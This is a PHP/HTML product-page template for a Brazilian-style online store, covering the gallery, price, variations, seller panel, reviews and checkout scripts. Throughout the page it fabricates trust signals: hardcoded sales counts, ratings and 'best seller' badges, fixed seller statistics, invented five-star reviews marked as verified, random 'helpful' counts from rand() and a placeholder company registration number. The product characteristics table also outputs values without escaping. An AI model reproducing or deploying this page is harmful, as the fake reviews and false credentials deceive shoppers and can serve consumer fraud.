          <img src="<?php echo $img_url; ?>" class="pdp-thumb <?php echo $idx === 0 ? 'active' : ''; ?>" onmouseover="changeMainImage('<?php echo $img_url; ?>', <?php echo $idx; ?>)" alt="Thumbnail <?php echo $idx+1; ?>">
          <?php endforeach; ?>
        </div>

        <!-- COLUNA CENTRAL (IMAGEM PRINCIPAL) -->
        <div class="pdp-column-middle" style="flex: 1;">
          <div class="pdp-main-img-container">
            <img src="<?php echo $todas_imgs[0]; ?>" id="pdpMainImg" class="pdp-main-img" alt="<?php echo htmlspecialchars($nomeproduto); ?>">
          </div>
          <div class="pdp-actions">
            <span><i class="fa-regular fa-heart"></i> Adicionar aos favoritos</span>
            <span><i class="fa-solid fa-share-nodes"></i> Compartilhar</span>
          </div>
        </div>
      </div>

      <!-- CARROSSEL PRODUTOS RELACIONADOS DESKTOP (Abaixo da Galeria) -->
      <?php if(!empty($produtos_relacionados_especificos)): ?>
      <div style="margin-top: 40px;">
        <div class="section-titulo" style="font-size: 20px; font-weight: 300; color: #666; margin-bottom: 15px;">Produtos relacionados</div>
        <div style="position: relative;">
            <div class="produtos-relacionados-track" id="relatedTrackDesktop" style="padding: 10px 5px; gap: 15px;">
              <?php foreach($produtos_relacionados_especificos as $outro):
                $outro_valor = (float)str_replace(',', '.', str_replace('.', '', $outro['valor']));
              ?>
              <a href="produto.php?produto=<?php echo $outro['codigo']; ?>" class="produto-relacionado-card" style="flex: 0 0 210px;">
                <div class="produto-relacionado-img-wrap">
                  <img src="<?php echo $outro['img']; ?>" alt="<?php echo htmlspecialchars($outro['nome']); ?>" class="produto-relacionado-img" loading="lazy">
                </div>
                <div class="produto-relacionado-info">
                  <div class="produto-relacionado-nome"><?php echo htmlspecialchars($outro['nome']); ?></div>
                  <div class="produto-relacionado-preco">R$ <?php echo number_format($outro_valor, 2, ',', '.'); ?></div>
                  <div class="produto-relacionado-parcela">10x R$ <?php echo number_format($outro_valor / 10, 2, ',', '.'); ?> sem juros</div>
                  <div class="produto-relacionado-entrega"><span class="frete-destaque">Frete grátis ⚡ <i>FULL</i></span></div>
                </div>
              </a>
              <?php endforeach; ?>
            </div>
            <button class="nav-arrow prev-arrow" onclick="document.getElementById('relatedTrackDesktop').scrollBy({left: -225, behavior: 'smooth'})" style="left: -15px;"><i class="fa-solid fa-chevron-left"></i></button>
            <button class="nav-arrow next-arrow" onclick="document.getElementById('relatedTrackDesktop').scrollBy({left: 225, behavior: 'smooth'})" style="right: -15px;"><i class="fa-solid fa-chevron-right"></i></button>
        </div>
      </div>
      <?php endif; ?>

    </div>

    <!-- LAYOUT MOBILE: CARROSSEL (MANTIDO) -->
    <div class="mobile-only" style="width: 100%;">
      <div class="badges-row">
        <div class="rating-row">
          <span>Novo | +500 vendidos</span>
        </div>
        <div class="rating-row">
          <span>4.9</span>
          <div class="stars">
            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
          </div>
          <span>(102)</span>
        </div>
      </div>
      <h1 class="produto-titulo"><?php echo htmlspecialchars($nomeproduto); ?></h1>
      <div class="carousel-wrapper">
        <div class="carousel-track" id="carouselTrack">
          <?php foreach($todas_imgs as $img_url): ?>
          <div class="carousel-slide">
            <img src="<?php echo $img_url; ?>" alt="<?php echo htmlspecialchars($nomeproduto); ?>">
          </div>
          <?php endforeach; ?>
        </div>
        <div class="carousel-counter">1/<?php echo count($todas_imgs); ?></div>
        <div class="carousel-dots">
          <?php foreach($todas_imgs as $index => $img_url): ?>
          <div class="carousel-dot <?php echo $index === 0 ? 'active' : ''; ?>"></div>
          <?php endforeach; ?>
        </div>
      </div>
    </div>

    <!-- COLUNA DIREITA (INFO E COMPRA) - COMUM OU ADAPTADA -->
    <div class="pdp-column-right">
      <div class="desktop-only">
        <div class="badges-row" style="margin-bottom: 8px;">
          <div class="rating-row">
            <span>Novo | +500 vendidos 4.9</span>
            <div class="stars">
              <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
            </div>
            <span>(102)</span>
          </div>
        </div>
        <div class="badges-row" style="padding-top: 0; margin-bottom: 15px;">
          <span class="badge-mais-vendido">MAIS VENDIDO</span>
          <span style="color: var(--store-blue); font-size: 12px;">1º em <?php echo $nome; ?></span>
        </div>
        <h1 class="produto-titulo" id="produtoTitulo"><?php echo htmlspecialchars($nomeproduto); ?></h1>
      </div>

      <div class="preco-section">
        <?php if($valor_original > $valor_total): ?>
        <div class="preco-original">R$ <?php echo number_format($valor_original, 2, ',', '.'); ?></div>
        <?php endif; ?>
        <div class="preco-atual-row">
          <span class="preco-simbolo">R$</span>
          <span class="preco-valor"><?php echo number_format($valor_total, 0, ',', '.'); ?></span>
          <span class="preco-simbolo-cent"><?php echo substr(number_format($valor_total, 2, ',', '.'), -2); ?></span>
          <?php if($desconto_num > 0): ?>
          <span class="preco-desconto"><?php echo $desconto; ?>% OFF</span>
          <?php endif; ?>
        </div>
        <div class="parcelamento">em 12x R$ <?php echo number_format($parcela12[1], 2, ',', '.'); ?></div>
        <a href="#pagamentos-section" class="metodos-pagamento">Ver os meios de pagamento</a>

        <div class="entrega-info">
          <i class="fa-solid fa-truck entrega-icon"></i>
          <div class="entrega-txt">
            <div style="color: var(--store-green); font-weight: bold;" id="data-entrega">Chegará grátis dia <?php echo date('d/m', strtotime('+8 days')); ?></div>
            <div style="color: #999; font-size: 12px;">Benefício Cliente VIP</div>
            <a href="#" class="entrega-link">Enviar para o seu CEP</a>
          </div>
        </div>

        <div class="entrega-info">
          <i class="fa-solid fa-arrow-rotate-left entrega-icon" style="color: #999;"></i>
          <div class="entrega-txt">
            <div style="color: var(--store-blue);">Devolução grátis</div>
            <div style="color: #999; font-size: 12px;">Você tem 30 dias a partir do recebimento.</div>
          </div>
        </div>
      </div>

      <?php if(!empty($variacoes)): ?>
      <div class="variacoes-section">
        <?php if(!empty($variacoes['cores_detalhes'])): ?>
        <div class="variacao-grupo">
          <span class="variacao-label">Cor: <strong id="label-cor"><?php echo htmlspecialchars($variacoes['cores_detalhes'][0]['nome']); ?></strong></span>
          <div class="ui-pdp-outside_variations__picker">
            <?php foreach($variacoes['cores_detalhes'] as $idx => $cor_obj):
                $img_cor = !empty($cor_obj['img']) ? $cor_obj['img'] : $todas_imgs[0];
            ?>
            <div class="btn-variacao-cor <?php echo $idx === 0 ? 'active' : ''; ?>"
                 data-tipo="cor"
                 data-valor="<?php echo htmlspecialchars($cor_obj['nome']); ?>"
                 data-titulo-variacao="<?php echo htmlspecialchars($cor_obj['titulo'] ?? $nomeproduto); ?>"
                 data-img-variacao="<?php echo htmlspecialchars($img_cor, ENT_QUOTES, 'UTF-8'); ?>">
              <img src="<?php echo htmlspecialchars($img_cor, ENT_QUOTES, 'UTF-8'); ?>" alt="<?php echo htmlspecialchars($cor_obj['nome']); ?>">
            </div>
            <?php endforeach; ?>
          </div>
        </div>
        <?php endif; ?>
        <?php if($tipo_produto === 'eletronico' && !empty($variacoes['voltagens'])): ?>
        <div class="variacao-grupo">
          <span class="variacao-label">Voltagem: <strong id="label-voltagem">Escolha</strong></span>
          <div class="variacao-opcoes">
            <?php foreach($variacoes['voltagens'] as $voltagem): ?>
            <button class="btn-variacao-texto" data-tipo="voltagem" data-valor="<?php echo htmlspecialchars($voltagem); ?>">
              <?php echo htmlspecialchars($voltagem); ?>
            </button>
            <?php endforeach; ?>
          </div>
        </div>
        <?php endif; ?>
        <?php if($tipo_produto === 'celular' && !empty($variacoes['armazenamento'])): ?>
        <div class="variacao-grupo">
          <span class="variacao-label">Memória interna: <strong id="label-armazenamento">Escolha</strong></span>
          <div class="variacao-opcoes">
            <?php foreach($variacoes['armazenamento'] as $armazenamento): ?>
            <button class="btn-variacao-texto" data-tipo="armazenamento" data-valor="<?php echo htmlspecialchars($armazenamento); ?>">
              <?php echo htmlspecialchars($armazenamento); ?>
            </button>
            <?php endforeach; ?>
          </div>
        </div>
        <?php endif; ?>
        <?php if($tipo_produto === 'roupa' && !empty($variacoes['tamanhos'])): ?>
        <div class="variacao-grupo">
          <span class="variacao-label">Tamanho: <strong id="label-tamanho">Escolha</strong></span>
          <div class="variacao-opcoes">
            <?php foreach($variacoes['tamanhos'] as $tamanho): ?>
            <button class="btn-variacao-texto" data-tipo="tamanho" data-valor="<?php echo htmlspecialchars($tamanho); ?>">
              <?php echo htmlspecialchars($tamanho); ?>
            </button>
            <?php endforeach; ?>
          </div>
        </div>
        <?php endif; ?>
      </div>
      <?php endif; ?>

      <a class="btn-comprar" id="btnComprarPrincipal" href="checkout.php?produto=<?php echo $codigo; ?>">COMPRAR AGORA</a>

      <div id="pagamentos-section" style="text-align: center; margin-top: 15px;">
        <img src="arquivos/pagamentos.webp" style="max-width: 100%; height: auto;" alt="Meios de Pagamento">
      </div>
    </div>
  </div>
</div>

<div class="vendedor-section">
  <div class="section-titulo">Informações sobre o vendedor</div>
  <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
    <i class="fa-solid fa-medal" style="color: var(--store-green); font-size: 24px;"></i>
    <div>
      <div style="color: var(--store-green); font-weight: bold;">Vendedor Destaque</div>
      <div style="font-size: 12px; color: #999;">É um dos melhores da loja!</div>
    </div>
  </div>
  <div class="termometro">
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel active"></div>
  </div>
  <div class="vendedor-stats">
    <div class="vendedor-stat">
      <span class="vendedor-stat-num">3400</span>
      <span class="vendedor-stat-txt">Vendas nos<br>últimos 60 dias</span>
    </div>
    <div class="vendedor-stat">
      <span class="vendedor-stat-num" style="color:var(--store-green);">✓</span>
      <span class="vendedor-stat-txt">Presta bom<br>atendimento</span>
    </div>
    <div class="vendedor-stat">
      <span class="vendedor-stat-num" style="color:var(--store-green);">✓</span>
      <span class="vendedor-stat-txt">Entrega os produtos<br>no prazo</span>
    </div>
  </div>
</div>

<?php if(!empty($caracteristicas)):
    $linhas = explode("\n", $caracteristicas);
?>
<div class="caracteristicas-section">
  <div class="section-titulo">Características do produto</div>
  <div id="caractContainer" class="caracteristicas-colapsada">
    <table class="caracteristicas-tabela">
        <?php
        foreach($linhas as $linha) {
            if(empty(trim($linha))) continue;
            if(strpos($linha, ":") !== false) {
                list($c_nome, $c_valor) = explode(":", $linha, 2);
                echo '<tr><td>'.trim($c_nome).'</td><td>'.trim($c_valor).'</td></tr>';
            } else {
                echo '<tr><td>'.trim($linha).'</td><td>Sim</td></tr>';
            }
        }
        ?>
    </table>
  </div>
  <button id="btnVerMaisCaract" class="btn-ver-mais" onclick="expandirCaracteristicas()">Ver todas as características</button>
</div>
<script>
function expandirCaracteristicas() {
  var container = document.getElementById('caractContainer');
  var btn = document.getElementById('btnVerMaisCaract');
  if (container.classList.contains('caracteristicas-colapsada')) {
    container.classList.remove('caracteristicas-colapsada');
    btn.innerText = 'Ver menos';
  } else {
    container.classList.add('caracteristicas-colapsada');
    btn.innerText = 'Ver todas as características';
    container.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }
}
</script>
<?php endif; ?>

<div class="detalhes-section">
  <div class="section-titulo">Detalhes do produto</div>
  <?php foreach($todas_imgs as $img_detalhe): ?>
  <img class="detalhes-img" src="<?php echo $img_detalhe; ?>" alt="Detalhe do produto" loading="lazy">
  <?php endforeach; ?>
</div>

<div class="descricao-section">
  <div class="section-titulo">Descrição</div>
  <div class="descricao-texto descricao-colapsada" id="descricaoTexto"><?php echo nl2br(htmlspecialchars($descricao)); ?></div>
  <button class="btn-ver-mais" id="btnVerMais" onclick="toggleDescricao()">Ver mais &#9660;</button>
</div>

<div class="avaliacoes-section">
  <div class="section-titulo">Opiniões do produto</div>
  <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 25px;">
    <div style="font-size: 48px; font-weight: 300; color: var(--store-blue);">4.9</div>
    <div style="display: flex; flex-direction: column; gap: 2px; padding-top: 8px;">
      <div style="color: var(--store-blue); font-size: 14px; display: flex; gap: 1px; letter-spacing: -1px;">
        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
      </div>
      <div style="font-size: 13px; color: #999; margin-top: 2px;">(102 avaliações)</div>
    </div>
  </div>
  <?php
  $reviews = json_decode(stripslashes($reviews_json), true);
  if(empty($reviews)) {
    $reviews = [
      ["nome"=>"Cláudia Martins","data"=>"15/04/2026","estrelas"=>5,"titulo"=>"Superou todas as expectativas!","texto"=>"Produto incrível! Chegou antes do prazo, embalagem impecável e a qualidade é muito melhor do que eu esperava.","fotos"=>[$todas_imgs[0]]],
      ["nome"=>"Sérgio Gomes","data"=>"10/04/2026","estrelas"=>5,"titulo"=>"Entrega rápida e produto top!","texto"=>"O produto é exatamente como descrito, acabamento de primeira e muito resistente. Atendimento nota 10!","fotos"=>[$todas_imgs[0]]],
      ["nome"=>"Fernanda Oliveira","data"=>"05/04/2026","estrelas"=>5,"titulo"=>"Melhor compra que já fiz!","texto"=>"Estou muito satisfeita com a compra. O produto chegou bem embalado, sem nenhum dano.","fotos"=>[$todas_imgs[0]]]
    ];
  }
  foreach($reviews as $rev):
    $estrelas = isset($rev['estrelas']) ? (int)$rev['estrelas'] : 5;
    $nome_rev = isset($rev['nome']) ? $rev['nome'] : "Cliente";
    $data_rev = isset($rev['data']) ? $rev['data'] : date('d/m/Y');
    $titulo_rev = isset($rev['titulo']) ? $rev['titulo'] : "Excelente";
    $texto_rev = isset($rev['texto']) ? $rev['texto'] : "";
    $fotos_rev = isset($rev['fotos']) ? $rev['fotos'] : array();
  ?>
	  <div class="avaliacao-card">
	    <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:8px;">
	      <div style="display:flex;align-items:flex-start;gap:8px;">
	        <div class="avatar-cliente"><?php echo mb_strtoupper(mb_substr($nome_rev,0,1,'UTF-8'),'UTF-8'); ?></div>
	        <div>
	          <div style="font-weight:600;font-size:13px;display:flex;align-items:center;gap:6px;"><?php echo ($nome_rev === "Cliente Loja Ester") ? "Cliente " . htmlspecialchars($nome) : htmlspecialchars($nome_rev); ?><span class="cliente-verificado">✓ Verificado</span></div>
	          <div style="font-size:11px;color:#999; margin-bottom: 3px;"><?php echo htmlspecialchars($data_rev); ?></div>
	          <div class="stars" style="font-size:11px; color: var(--store-blue); letter-spacing: -1px;"><?php echo str_repeat('<i class="fa-solid fa-star"></i>', $estrelas); ?></div>
	        </div>
	      </div>
	    </div>
    <div style="font-weight:600;font-size:14px;margin-bottom:5px;"><?php echo htmlspecialchars($titulo_rev); ?></div>
    <div style="font-size:14px;color:#666;line-height:1.4;"><?php echo htmlspecialchars($texto_rev); ?></div>
    <?php if(!empty($fotos_rev)): ?>
    <div class="review-photos">
      <?php foreach($fotos_rev as $f_rev): ?>
      <img src="<?php echo $f_rev; ?>" alt="Foto da avaliação" class="review-photo">
      <?php endforeach; ?>
    </div>
    <?php endif; ?>
    <div style="display: flex; justify-content: flex-end; align-items: center; gap: 15px; margin-top: 15px; font-size: 13px; color: #666;">
      <span style="cursor: pointer; display: flex; align-items: center; gap: 5px;">
        <i class="fa-regular fa-thumbs-up"></i> Útil (<?php echo rand(10, 500); ?>)
      </span>
      <span style="cursor: pointer; font-weight: bold; letter-spacing: 2px;">...</span>
    </div>
  </div>
	  <?php endforeach; ?>
	</div>

	<?php if(!empty($outros_produtos)): ?>
	<div class="produtos-relacionados-section" aria-label="Produtos relacionados" style="position: relative; max-width: 1200px; margin: 80px auto 40px; padding: 0 15px;">
	  <div class="section-titulo" style="font-size: 16px; font-weight: 300; color: #666; margin-top: 20px; margin-bottom: 20px; text-align: center;">Quem viu este produto também comprou</div>

      <div style="position: relative;">
          <div class="produtos-relacionados-track" id="relatedTrackMobile">
            <?php foreach($outros_produtos as $outro):
              $outro_valor = (float)str_replace(',', '.', str_replace('.', '', $outro['valor']));
              $outro_parcela = number_format($outro_valor / 12, 2, ',', '.');
            ?>
            <a href="produto.php?produto=<?php echo $outro['codigo']; ?>" class="produto-relacionado-card">
              <div class="produto-relacionado-img-wrap">
                <img src="<?php echo $outro['img']; ?>" alt="<?php echo htmlspecialchars($outro['nome']); ?>" class="produto-relacionado-img" loading="lazy">
              </div>
              <div class="produto-relacionado-info">
                <div class="produto-relacionado-nome"><?php echo htmlspecialchars($outro['nome']); ?></div>
                <div class="produto-relacionado-preco">R$ <?php echo number_format($outro_valor, 2, ',', '.'); ?></div>
                <div class="produto-relacionado-parcela">10x R$ <?php echo number_format($outro_valor / 10, 2, ',', '.'); ?> sem juros</div>
                <div class="produto-relacionado-entrega"><span class="frete-destaque">Frete grátis ⚡ <i>FULL</i></span> <span class="frete-complemento">por ser sua primeira compra</span></div>
              </div>
            </a>
            <?php endforeach; ?>
          </div>

          <button class="nav-arrow prev-arrow" onclick="document.getElementById('relatedTrackMobile').scrollBy({left: -300, behavior: 'smooth'})"><i class="fa-solid fa-chevron-left"></i></button>
          <button class="nav-arrow next-arrow" onclick="document.getElementById('relatedTrackMobile').scrollBy({left: 300, behavior: 'smooth'})"><i class="fa-solid fa-chevron-right"></i></button>
      </div>
	</div>
	<?php endif; ?>

	<div class="sticky-bar hidden">
  <div class="sticky-preco-info">
    <span class="sticky-preco-valor">R$ <?php echo number_format($valor_total, 2, ',', '.'); ?></span>
  </div>
  <a class="sticky-btn" href="checkout.php?produto=<?php echo $codigo; ?>">Comprar agora</a>
</div>

<footer class="footer-main">
  <div class="footer-content">
    <div class="footer-top">
      <div class="footer-links-container">
        <a href="politica-de-privacidade.php" class="footer-link">Política de Privacidade</a>
        <a href="termos-de-uso.php" class="footer-link">Termos de Uso</a>
        <a href="trocas-e-devolucoes.php" class="footer-link">Trocas e Devoluções</a>
        <a href="mailto:contato@<?php echo str_replace(' ', '', strtolower($nome)); ?>.com.br" class="footer-link">Contato</a>
      </div>
    </div>
    <div class="footer-bottom">
      <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?>. Todos os direitos reservados.</p>
      <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
    </div>
  </div>
</footer>

<div id="store-loading-overlay" style="display: none;">
    <div class="spinner"></div>
    <p style="color: #666; font-size: 14px;">Processando seu pedido...</p>
</div>

<script>
	var carouselTrack = document.getElementById('carouselTrack');
	var dots = document.querySelectorAll('.carousel-dot');
	var counter = document.querySelector('.carousel-counter');

	function changeMainImage(url, index) {
	    const mainImg = document.getElementById('pdpMainImg');
	    if (mainImg) mainImg.src = url;

	    document.querySelectorAll('.pdp-thumb').forEach(t => t.classList.remove('active'));
	    const thumbs = document.querySelectorAll('.pdp-thumb');
	    if (thumbs[index]) thumbs[index].classList.add('active');
	}

	if(carouselTrack) {
	    carouselTrack.addEventListener('scroll', function() {
	        var scrollLeft = carouselTrack.scrollLeft;
	        var width = carouselTrack.offsetWidth;
	        var index = Math.round(scrollLeft / width);

	        dots.forEach(dot => dot.classList.remove('active'));
	        if(dots[index]) dots[index].classList.add('active');
	        if(counter) counter.innerText = (index + 1) + '/' + dots.length;
	    });
	}

	const codigoProduto = <?php echo json_encode($codigo); ?>;
	const nomeProdutoOriginal = <?php echo json_encode($nomeproduto); ?>;
	const precoProdutoFormatado = <?php echo json_encode(number_format($valor_total, 2, ',', '.')); ?>;
	const imagemProdutoOriginal = <?php echo json_encode($todas_imgs[0]); ?>;
	let variacoesSelecionadas = {};

	function salvarEstadoCheckout() {
	    const dadosCarrinho = {
	        produto: codigoProduto,
	        quantos: 1,
	        precoFinal: precoProdutoFormatado,
	        precoUnitario: precoProdutoFormatado
	    };
	    localStorage.setItem('lojavirtual', JSON.stringify(dadosCarrinho));
	    localStorage.setItem('variacoes_selecionadas', JSON.stringify(variacoesSelecionadas));
	    atualizarLinksCheckout();
	}

	function atualizarLinksCheckout() {
	    const params = new URLSearchParams({ produto: codigoProduto });
	    Object.entries(variacoesSelecionadas).forEach(([chave, valor]) => {
	        if (!valor || ['titulo_selecionado', 'imagem_selecionada', 'titulo', 'img'].includes(chave)) return;
	        params.set(chave, valor);
	    });
	    const hrefCheckout = 'checkout.php?' + params.toString();
    document.querySelectorAll('.btn-comprar, .sticky-btn').forEach(btn => {
        btn.setAttribute('href', hrefCheckout);
    });
	}

		function aplicarImagemVariacao(img) {
		    if (!img) return;

			    // Atualiza imagem principal no Desktop
			    const mainImg = document.getElementById('pdpMainImg');
			    if (mainImg) mainImg.setAttribute('src', img);



		    // Atualiza primeira imagem do carrossel no Mobile
		    const primeiraImagem = document.querySelector('#carouselTrack .carousel-slide:first-child img');
		    if (primeiraImagem) {
		        primeiraImagem.setAttribute('src', img);
		    }
		}

	function toggleDescricao() {
	    const texto = document.getElementById('descricaoTexto');
	    const btn = document.getElementById('btnVerMais');
	    if (texto.classList.contains('descricao-colapsada')) {
	        texto.classList.remove('descricao-colapsada');
	        btn.innerHTML = 'Ver menos &#9650;';
	    } else {
	        texto.classList.add('descricao-colapsada');
	        btn.innerHTML = 'Ver mais &#9660;';
	        texto.scrollIntoView({ behavior: 'smooth', block: 'start' });
	    }
	}

	$(document).ready(function() {
	    $('.btn-variacao-texto, .btn-variacao-cor').on('click', function() {
	        const tipo = $(this).data('tipo');
	        const valor = $(this).data('valor');
	        const botao = this;

	        $(`[data-tipo="${tipo}"]`).removeClass('active');
	        $(this).addClass('active');

	        variacoesSelecionadas[tipo] = valor;

	        if (tipo === 'cor') {
	            $('#label-cor').text(valor);
	            const titulo = String($(botao).data('titulo-variacao') || nomeProdutoOriginal).trim();
	            const img = String($(botao).data('img-variacao') || imagemProdutoOriginal).trim();
	            variacoesSelecionadas.titulo_selecionado = titulo || nomeProdutoOriginal;
	            variacoesSelecionadas.imagem_selecionada = img || imagemProdutoOriginal;
		        $('#produtoTitulo').text(variacoesSelecionadas.titulo_selecionado);

		        aplicarImagemVariacao(variacoesSelecionadas.imagem_selecionada);
	        }
	        if (tipo === 'voltagem') $('#label-voltagem').text(valor);
	        if (tipo === 'armazenamento') $('#label-armazenamento').text(valor);
	        if (tipo === 'tamanho') $('#label-tamanho').text(valor);

	        salvarEstadoCheckout();
	    });

	    salvarEstadoCheckout();
	});

	function showLoading(e) {
	    document.getElementById('store-loading-overlay').style.display = 'flex';
	}

	window.addEventListener('load', function() {
	    if (document.getElementById('store-loading-overlay')) {
	        document.getElementById('store-loading-overlay').style.display = 'none';
	    }
	});

	document.querySelectorAll('.btn-comprar, .sticky-btn').forEach(btn => {
	    btn.addEventListener('click', showLoading);
	});

	var header = document.getElementById('dynamicHeader');
	var stickyBar = document.querySelector('.sticky-bar');
	var btnComprar = document.querySelector('.btn-comprar');
	window.addEventListener('scroll', function() {
	  if (window.scrollY > 50) {
	    header.classList.add('compact-mode');
	  } else {
	    header.classList.remove('compact-mode');
	  }
	  if(btnComprar) {
	    var rect = btnComprar.getBoundingClientRect();
	    if(rect.top < window.innerHeight && rect.bottom > 0) {
	      stickyBar.classList.add('hidden');
	    } else {
	      stickyBar.classList.remove('hidden');
	    }
	  }
	});
</script>

<?php if(!empty($zap_cotacao) && $zap_flutuante_ativo == "1"): ?>
<!-- Botão Flutuante WhatsApp -->
<a href="https://wa.me/<?php echo preg_replace('/[^0-9]/', '', $zap_cotacao); ?>?text=Olá! Gostaria de fazer uma cotação." target="_blank" class="floating-whatsapp">
  <i class="fa-brands fa-whatsapp"></i>
  <span>Fazer cotação</span>
</a>
<?php endif; ?>

</body>
</html>


